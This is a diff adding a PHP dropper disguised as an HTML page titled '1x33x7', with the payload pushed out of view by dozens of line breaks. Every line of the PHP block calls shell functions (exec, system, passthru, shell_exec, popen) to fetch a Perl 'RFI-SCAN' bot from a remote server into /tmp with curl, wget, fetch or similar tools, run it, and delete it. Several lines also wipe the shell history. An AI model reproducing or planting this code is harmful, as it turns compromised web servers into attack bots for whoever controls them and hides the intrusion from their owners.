@@ -1,0 +1,57 @@
+<title>1x33x7</title>
+<h2>PHPESSID546343569346834781478127128748375823758235782357823</h2><br><br>END OF BYPASS FILE<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<?
+$url="http://www.YOUR-SERVER-WITH.BOTDIRECTORY-GOES-HERE.COM/bot-directory/";
+exec('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+exec('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt > RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+exec('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+exec('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+exec('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+passthru('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+passthru('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+passthru('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+passthru('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+passthru('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+system('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+system('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+system('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+system('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+system('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+shell_exec('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+shell_exec('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+shell_exec('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+shell_exec('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+shell_exec('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+popen('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm RFI-SCAN.V2.PRIVATE.txt*;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt; perl RFI-SCAN.V2.PRIVATE.txt;rm RFI-SCAN.V2.PRIVATE.txt*;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;lynx -source '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@exec('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@exec('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt > RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@exec('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@exec('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@exec('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@passthru('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@passthru('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@passthru('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@passthru('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@passthru('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@system('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@system('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@system('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@system('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@system('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@shell_exec('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@shell_exec('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@shell_exec('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@shell_exec('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@shell_exec('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm -f RFI-SCAN.V2.PRIVATE.txt*;');
+@popen('cd /tmp;wget '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;rm RFI-SCAN.V2.PRIVATE.txt*;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;curl -O '.$url.'RFI-SCAN.V2.PRIVATE.txt; perl RFI-SCAN.V2.PRIVATE.txt;rm RFI-SCAN.V2.PRIVATE.txt*;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;lwp-download '.$url.'RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;lynx -source '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;fetch '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;GET '.$url.'RFI-SCAN.V2.PRIVATE.txt >RFI-SCAN.V2.PRIVATE.txt;perl RFI-SCAN.V2.PRIVATE.txt;/usr/bin/perl RFI-SCAN.V2.PRIVATE.txt;rm -f $HISTFILE', "r");
+?>
